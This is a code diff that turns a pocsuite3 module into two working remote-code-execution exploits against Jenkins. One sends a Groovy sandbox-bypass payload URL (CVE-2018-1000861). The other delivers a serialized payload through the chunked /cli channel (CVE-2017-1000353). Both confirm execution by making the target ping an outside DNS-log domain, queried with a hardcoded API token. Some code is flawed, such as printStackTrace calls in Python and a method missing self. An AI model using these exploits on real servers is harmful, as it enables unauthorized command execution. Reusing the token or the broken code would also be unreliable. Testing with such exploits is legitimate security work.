@@ -1,97 +1,250 @@
-from pocsuite3.api import (
-    Output,
-    POCBase,
-    POC_CATEGORY,
-    register_poc,
-    requests,
-    VUL_TYPE,
-    get_listener_ip,
-    get_listener_port,
-)
-import requests
-requests.packages.urllib3.disable_warnings()
+#!/usr/bin/env python
+#coding=utf-8
 
+import random
+import json
+import time
+from string import ascii_letters
+import threading
+import uuid
+import subprocess
+import os
 
-class JenkinsPOC(POCBase):
-    vulID = ""  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
-    version = "1"  # 默认为1
-    author = "Ninggo"  # PoC作者的大名
-    vulDate = "2022-7-17"  # 漏洞公开的时间,不知道就写今天
-    createDate = "2022-7-17"  # 编写 PoC 的日期
-    updateDate = "2022-7-17"  # PoC 更新的时间,默认和编写时间一样
-    references = ["https://www.jenkins.io"]  # 漏洞地址来源,0day不用写
-    name = "jenkins未授权访问POC"  # PoC 名称
-    appPowerLink = "https://www.jenkins.io"  # 漏洞厂商主页地址
-    appName = "jenkins未授权访问漏洞"  # 漏洞应用名称
-    appVersion = "2.332.2"  # 漏洞影响版本
-    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS  # 漏洞类型,类型参考见 漏洞类型规范表
-    category = POC_CATEGORY.EXPLOITS.WEBAPP
-    samples = []  # 测试样列,就是用 PoC 测试成功的网站
+from pocsuite3.api import requests as req
+from pocsuite3.api import register_poc
+from pocsuite3.api import Output, POCBase
+from pocsuite3.api import POC_CATEGORY, VUL_TYPE
+
+# 需要CVE-2017-1000353-1.1-SNAPSHOT-all.jar包
+# 
+
+'''
+CVE-2018-1000861
+https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2018-1000861
+'''
+class Jenkins_RCE_2018_1000861_POC(POCBase):
+    vulID = 'Jenkins-CVE-2018-1000861'
+    appName = 'Jenkins'
+    appVersion = 'Jenkins weekly <= 2.153; Jenkins LTS <= 2.138.3'
+    category = POC_CATEGORY.EXPLOITS.REMOTE
+    vulType = VUL_TYPE.CODE_EXECUTION
+    vulDate = '2018-12-05'  # 漏洞公开的时间,不知道就写今天
+    author = 'shadowsock5'  # PoC作者的大名
+    createDate = '2019-02-24'  # 编写 PoC 的日期
+    updateDate = '2020-02-24'  # PoC 更新的时间,默认和编写时间一样
+    references = ['https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595']  # 漏洞地址来源,0day不用写
+    name = 'Jenkins RCE CVE-2018-1000861'  # PoC 名称
     install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
-    desc = """
-            java语言开发，用于监控持续重复的工作，包括：持续的软件版本发布/测试项目，监控外部调用执行的工作。
-        """  # 漏洞简要描述
-    pocDesc = """
-            检测未授权访问从而利用实现远程命令执行。
-        """  # POC用法描述
+    cvss = u"高危"
 
-    # 漏洞检测方法
-    def _check(self):
-        result = []
-        url1 = f"{self.url}/manage"
-        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
-                   "Accept": "text/javascript, text/html, application/xml, text/xml, */*",
-                   "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-                   "Accept-Encoding": "gzip, deflate", "Referer": f"{self.url}/manage",
-                   "X-Requested-With": "XMLHttpRequest", "X-Prototype-Version": "1.7",
-                   "Content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-                   "Jenkins-Crumb": "cf42bf61b2b1206e421f25a5487a96eea6f8780bf1745effd59993c88465eaa6",
-                   "Origin": f"{self.url}", "Connection": "close"}
+    
+    # 使用随机字符串作为banner，通过ceye的接口判断命令是否被执行
+    DOMAIN = 'wvg689.ceye.io'
+    TOKEN = '76dce59a986eab595838f7dc74903035'
+    BANNER = ''.join([random.choice(ascii_letters) for i in range(6)])
+    CEYE_URL = 'http://api.ceye.io/v1/records?token={0}&type=dns&filter={1}'.format(TOKEN, BANNER)
 
-        try:
-            response = requests.get(url1, headers=headers,allow_redirects=False, verify=False,timeout=5)
-            if response.status_code == 200 and "Manage Jenkins [Jenkins]" in response.text:
-                result.append(self.url)
-        except Exception:
-             pass
-        finally:
-            return result
+    http_proxy  = "http://127.0.0.1:8087"
+    proxies = {"http": http_proxy, "https": http_proxy}
 
     def _verify(self):
-        # 验证模式 , 调用检查代码
-        result = {}
-        res = self._check()  # res就是返回的结果列表
-        if res:
-            # 这些信息会在终端上显示
-            result['VerifyInfo'] = {}
-            result['VerifyInfo']['Info'] = self.name
-            result['VerifyInfo']['vul_url'] = self.url
-            result['VerifyInfo']['vul_detail'] = self.desc
-        return self.parse_verify(result)
+        result={}
 
+        vul_url = self.url
+        target_url = vul_url
+        
+        #command = "'ping {0}.{1}'".format(self.BANNER, self.DOMAIN)
+        command = "touch /tmp/jenkins_{0}".format(self.BANNER)
+
+        payload_url = vul_url + '/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript' + \
+        '?sandbox=true&value=' + \
+        'public class x %7b public x()%7b"{0}".execute()%7d%7d'.format(command)
+        
+        try:
+            req.get(payload_url, proxies=self.proxies)
+        except Exception as e:
+            e.printStackTrace()
+        
+        time.sleep(2) # 休眠2s等待ceye生成记录
+        if self.test_dnslog(self.CEYE_URL):
+            result['VerifyInfo'] = {}
+            result['VerifyInfo']['URL'] = target_url
+            return self.save_output(result)
+        return self.save_output(result)
+
+    # 验证DNS已被解析，命令执行
+    def test_dnslog(self, url):
+        resp = req.get(url)
+        d = resp.json()
+        try:
+            name = d['data'][0]['name']
+            if self.BANNER in name:
+                return True
+        except Exception:
+            return False            
+
+    # 攻击模块
     def _attack(self):
         return self._verify()
-        # 攻击模式即重新调用_verify方法
 
-    def parse_verify(self, result):
-        # 解析认证 , 输出
+    # 输出报告
+    def save_output(self, result):
         output = Output(self)
-        # 根据result的bool值判断是否有漏洞
         if result:
             output.success(result)
         else:
-            output.fail('Target is not vulnerable')
+            output.fail()
         return output
 
-def other_fuc():
-    pass
 
-# 未知功能
+'''
+CVE-2017-1000353
+https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2017-1000353
+'''
+class Jenkins_RCE_2017_1000353_POC(POCBase):
+    vulID = 'Jenkins-CVE-2017-1000353'
+    appName = 'Jenkins'
+    appVersion = 'Jenkins主版本 <=2.56版本; Jenkins LTS  <=2.46.1版本'
+    category = POC_CATEGORY.EXPLOITS.REMOTE
+    vulType = VUL_TYPE.CODE_EXECUTION
+    vulDate = '2017-04-26'  # 漏洞公开的时间,不知道就写今天
+    author = 'shadowsock5'  # PoC作者的大名
+    createDate = '2019-02-24'  # 编写 PoC 的日期
+    updateDate = '2020-02-24'  # PoC 更新的时间,默认和编写时间一样
+    references = ['https://jenkins.io/security/advisory/2017-04-26/#cli-unauthenticated-remote-code-execution']  # 漏洞地址来源,0day不用写
+    name = 'Jenkins反序列化RCE'  # PoC 名称
+    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
+    cvss = u"高危"
 
-def other_utils_func():
-    pass
+    
+    # 使用随机字符串作为banner，通过ceye的接口判断命令是否被执行
+    DOMAIN = 'wvg689.ceye.io'
+    TOKEN = '76dce59a986eab595838f7dc74903035'
+    BANNER = ''.join([random.choice(ascii_letters) for i in range(6)])
+    CEYE_URL = 'http://api.ceye.io/v1/records?token={0}&type=dns&filter={1}'.format(TOKEN, BANNER)
 
-# 未知功能
+    PREAMLE = b'<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4='
+    PROTO = b'\x00\x00\x00\x00'
+    FILE_SER = None
 
-# 注册 DemoPOC 类,必须保留并注册
-register_poc(JenkinsPOC)
+    http_proxy  = "http://127.0.0.1:8087"
+    proxies = {"http": http_proxy, "https": http_proxy}
+
+
+    def _verify(self):
+        result={}
+
+        vul_url = self.url + "/cli"
+        target_url = self.url
+
+        host = vul_url.strip("http://").strip("https://").split(':')[0]
+        port = vul_url.strip("http://").strip("https://").split(':')[1]
+        
+        # 云上JAR包文件路径
+        JAR_PATH = "~/GitProjects/vulhub/jenkins/CVE-2017-1000353/CVE-2017-1000353-1.1-SNAPSHOT-all.jar"
+
+        #payload = "/System/Applications/Calculator.app/Contents/MacOS/Calculator"
+        payload = "'ping {0}.{1}'".format(self.BANNER, self.DOMAIN)
+        #payload = "'touch /tmp/jenkins_{0}'".format(self.BANNER)
+
+        out_ser = "jenkins_poc.ser"
+
+        command1 = "java -jar {0} {1} {2}".format(JAR_PATH, out_ser, payload)
+
+        # 第一步，根据payload生成序列化文件
+        pro = subprocess.Popen(command1,
+                stdout=subprocess.PIPE,shell=True, preexec_fn=os.setsid)
+        print(command1)
+        
+        try:
+            # 读取第一步生成的序列化文件
+            with open(out_ser, "rb") as f:
+                self.FILE_SER = f.read()
+            
+            session = str(uuid.uuid4())
+            t = threading.Thread(target=self.download, args=(vul_url, session))
+            t.start()
+
+            self.upload_chunked(vul_url, session, "asdf")
+        except Exception as e:
+            e.printStackTrace()
+        
+        time.sleep(2) # 休眠2s等待ceye生成记录
+        if self.test_dnslog(self.CEYE_URL):
+            result['VerifyInfo'] = {}
+            result['VerifyInfo']['URL'] = target_url
+            return self.save_output(result)
+        return self.save_output(result)
+
+
+    def null_payload(self):
+        yield b" "
+
+
+    def generate_payload(self):
+        payload = self.PREAMLE + self.PROTO + self.FILE_SER
+        return payload
+
+
+    def generate_payload_chunked(self):
+        yield self.PREAMLE
+        yield self.PROTO
+        yield self.FILE_SER
+
+
+    def download(self, url, session):
+        headers = {'Side' : 'download'}
+        headers['Content-type'] = 'application/x-www-form-urlencoded'
+        headers['Session'] = session
+        headers['Transfer-Encoding'] = 'chunked'
+        r = req.post(url, data=self.null_payload(), headers=headers, proxies=self.proxies, stream=True, verify=False)
+        #print(r.content)
+
+
+    def upload(url, session, data):
+        headers = {'Side' : 'upload'}
+        headers['Session'] = session
+        headers['Content-type'] = 'application/octet-stream'
+        headers['Accept-Encoding'] = None
+        r = req.post(url, data=data, headers=headers, proxies=self.proxies, verify=False)
+
+
+    def upload_chunked(self, url,session, data):
+        headers = {'Side' : 'upload'}
+        headers['Session'] = session
+        headers['Content-type'] = 'application/octet-stream'
+        headers['Accept-Encoding']= None
+        headers['Transfer-Encoding'] = 'chunked'
+        headers['Cache-Control'] = 'no-cache'
+        r = req.post(url, headers=headers, data=self.generate_payload_chunked(), proxies=self.proxies, verify=False)
+
+
+    # 验证DNS已被解析，命令执行
+    def test_dnslog(self, url):
+        resp = req.get(url)
+        d = resp.json()
+        try:
+            name = d['data'][0]['name']
+            if self.BANNER in name:
+                return True
+        except Exception:
+            return False            
+
+    # 攻击模块
+    def _attack(self):
+        return self._verify()
+
+    # 输出报告
+    def save_output(self, result):
+        output = Output(self)
+        if result:
+            output.success(result)
+        else:
+            output.fail()
+        return output
+
+# 注册类
+register_poc(Jenkins_RCE_2018_1000861_POC)
+register_poc(Jenkins_RCE_2017_1000353_POC)
+
+
